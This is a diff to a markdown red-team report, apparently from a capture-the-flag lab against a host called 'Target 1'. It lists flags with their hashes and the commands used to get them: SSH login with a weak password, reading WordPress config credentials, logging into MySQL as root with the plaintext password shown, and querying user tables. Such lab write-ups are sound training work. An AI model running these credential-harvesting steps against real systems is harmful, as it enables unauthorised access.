@@ -338,32 +338,42 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 * Target 1
     * flag1.txt: b9bbcb33e11b80be759c4e844862482d
+    * * Exploit Used
+    * Weak Password / SSH with password
+    * After SSHing into the host with michael's credentials, we were able to search the /var/www/html directory for flag1.
+    * Commands run:
+    * ssh michael@192.168.1.100
+    * cd /var/www/html
+    * cat *.html | grep flag
     * <img src="./Images/Flag1capture.png" width=600>
-        * Exploit Used
-            * Weak Password / SSH with password
-                * After SSHing into the host with michael's credentials, we were able to search the /var/www/html directory for flag1.
-            * Commands run:
-                * ssh michael@192.168.1.100
-                * cd /var/www/html
-                * cat *.html | grep flag
+   
     * flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
     * <img src="./Images/flag2_again.png" width="600">
-        * Exploit Used
-            * Weak Password / SSH with password
-                * After SSHing into the host with michael's credentials, flag2 was found right in /var/www
-            * Commands run:
-                * ssh michael@192.168.1.100
-                * cd /var/www
-                * cat flag2.txt
+    * Exploit Used
+    * Weak Password / SSH with password
+    * After SSHing into the host with michael's credentials, flag2 was found right in /var/www
+    * Commands run:
+    * ssh michael@192.168.1.100
+    * cd /var/www
+    * cat flag2.txt
+   
     * flag3.txt: afc01ab56b50591e7dccf93122770cd2
         * Exploit Used
             * Database credentials in plain text
                 * After getting the database credentials from /var/www/html/wp_config.php, we connected to the mysql database and searched for the flag.
             * Commands run:
                 * ssh michael@192.168.1.100
-                * less /var/www/html/wp_config.php
-                * mysql --user root --password # Password is R@v3nSecurity
-                * mysql> SELECT post_title, post_content FROM wp_posts WHERE post_title LIKE "flag%";
+                * less /var/www/html/wordpress/wp_config.php
+                * mysql -u root -p
+                * Password is R@v3nSecurity
+                * <img src="./Images/mysql_pass.png" width="700">
+                * mysql> show databases;
+                * mysql> use wordpress
+                * mysql> show tables;
+                * <img src="./Images/tablemysql.png" width="600">
+                * mysql> select * from wp_users;
+                * <img src="./Images/wpusers.png" width="800">
+                * mysql> select * from wp_users;
                 * This returned the value for flag 3
     * flag4.txt: 715dea6c055b9fe3337544932f2941ce
         * Exploit Used
